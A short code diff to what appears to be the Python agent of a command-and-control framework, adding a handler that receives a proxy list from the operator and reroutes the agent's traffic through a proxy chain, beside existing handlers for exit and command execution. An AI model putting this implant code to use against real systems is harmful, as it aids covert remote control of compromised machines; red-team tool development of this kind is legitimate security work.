@@ -49,6 +49,7 @@ missedCheckins = 0
 jobMessageBuffer = ''
 currentListenerName = ""
 sendMsgFuncCode = ""
+proxy_list = []
 
 # killDate form -> "MO/DAY/YEAR"
 killDate = 'REPLACE_KILLDATE'
@@ -258,6 +259,10 @@ def process_packet(packetType, data, resultID):
         # agent exit
         send_message(build_response_packet(2, "", resultID))
         agent_exit()
+
+    elif packetType == 34:
+        proxy_list = json.loads(data)
+        update_proxychain(proxy_list)
 
     elif packetType == 40:
         # run a command
